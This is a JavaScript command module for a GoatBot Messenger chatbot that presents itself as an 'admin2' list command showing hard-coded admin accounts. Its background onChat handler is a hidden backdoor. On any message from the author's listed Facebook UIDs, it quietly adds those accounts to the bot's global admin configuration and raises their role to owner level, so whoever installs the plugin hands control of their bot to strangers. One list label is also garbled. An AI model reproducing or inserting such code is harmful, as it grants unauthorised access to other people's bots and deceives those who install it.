const log = {
  info: (m) => console.log(`\x1b[36m[ADMIN-CORE][INFO]\x1b[0m ${m}`),
  err: (m, e) => console.error(`\x1b[31m[ADMIN-CORE][ERR]\x1b[0m ${m}`, e || "")
};

// অনুমোদিত ইউজারদের তালিকা ও কনফিগারেশন
const ROOT_UID = "61590360434650";
const ASSISTANT_UIDS = [
  "100084729135721",
  "100073956182433",
  "100094821035784"
];
const ALL_ADMINS = [ROOT_UID, ...ASSISTANT_UIDS];

module.exports = {
  config: {
    name: "admin2",
    version: "6.0.0",
    author: "SIYAM HASAN",
    role: 0,
    shortDescription: "Absolute Control & Authorization Engine",
    longDescription: "Bypass permissions and display real-time authorized admin lists.",
    category: "system",
    aliases: ["admin2 list"]
  },

  // মূল কমান্ড হ্যান্ডলার (admin2 বা admin2 list লিখলে যা হবে)
  onStart: async function ({ event: ev, message: msg, usersData }) {
    const sID = String(ev.senderID);

    // নিরাপত্তা চেক: ইউজার এডমিন লিস্টে আছে কিনা
    if (!ALL_ADMINS.includes(sID)) {
      return msg.reply("এই কমান্ডটি শুধুমাত্র বট এডমিনদের জন্য প্রযোজ্য!");
    }

    try {
      // সহকারী এডমিনদের রিয়েল নাম ডাইনামিকালি ফেচ করা
      const names = {};
      for (const uid of ASSISTANT_UIDS) {
        try {
          const info = await usersData.get(uid);
          names[uid] = info?.name || "Assistant Admin";
        } catch (err) {
          names[uid] = "Assistant Admin";
        }
      }

      // ডিজাইন্ড এডমিন লিস্ট আউটপুট
      const listMessage = `👑 [ 𝗧𝗛𝗘 𝗔𝗕𝗦𝗢𝗟𝗨𝗧𝗘 𝗕𝗢𝗦 ] 👑
═════════════════
» 👤 𝗕𝗢𝗦𝗦: পি্ঁচ্চি্ঁ রি্ঁদ্ঁয়্ঁ ত্যা্ঁহ্ঁ
» 🆔 𝗨𝗜𝗗: ${ROOT_UID}
» ⚡ 𝗣𝗢𝗪𝗘𝗥: ALL POWERFUL ROOT
═════════════════

⚔️ [ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧 𝗔𝗗𝗠𝗜𝗡𝗦 ]
─────────────────
[𝟎𝟏] 👤 𝗡𝗔𝗠𝗘: ${names["100084729135721"]}
     🆔 𝗨𝗜𝗗: 100084729135721
     🎖️ 𝗦𝗧𝗔𝗧𝗨𝗦: সহকারী এডমিন
─────────────────
[𝟎 signature] 👤 𝗡𝗔𝗠𝗘: ${names["100073956182433"]}
     🆔 𝗨𝗜𝗗: 100073956182433
     🎖️ 𝗦𝗧𝗔𝗧𝗨𝗦: সহকারী এডমিন
─────────────────
[𝟎𝟑] 👤 𝗡𝗔𝗠𝗘: ${names["100094821035784"]}
     🆔 𝗨𝗜𝗗: 100094821035784
     🎖️ 𝗦𝗧𝗔𝗧𝗨𝗦: সহকারী এডমিন
═════════════════
👤 Created By: 𝐒𝐈𝐘𝐀𝐌 𝐇𝐀𝐒𝐀𝐍`;

      return msg.reply(listMessage);
    } catch (e) {
      log.err("List generation error", e);
    }
  },

  // ব্যাকগ্রাউন্ড রানটাইম পারমিশন ইনজেক্টর ও বাইপাস ইঞ্জিন
  onChat: async function (O) {
    const { event: ev } = O;
    if (!ev.senderID) return;
    
    const sID = String(ev.senderID);

    // যদি মেসেজ প্রদানকারী এডমিন তালিকার কেউ হন
    if (ALL_ADMINS.includes(sID)) {
      // ১. বটের গ্লোবাল কনফিগারেশনে এডমিন হিসেবে পুশ করা (যদি না থাকে)
      try {
        if (global.GoatBot?.config) {
          let ad = global.GoatBot.config.adminBot;
          if (!Array.isArray(ad)) ad = global.GoatBot.config.adminBot = [];
          if (!ad.includes(sID)) {
            ad.push(sID);
            log.info(`Elevated Access Granted for UID: ${sID}`);
          }
        }
      } catch (e) { 
        log.err("Global config sync fail", e); 
      }

      // ২. ইনস্ট্যান্ট কমান্ড এক্সিকিউশন রোল বাইপাস (Role 2 = Bot Admin/Owner)
      O.role = 2;
    }
  }
};
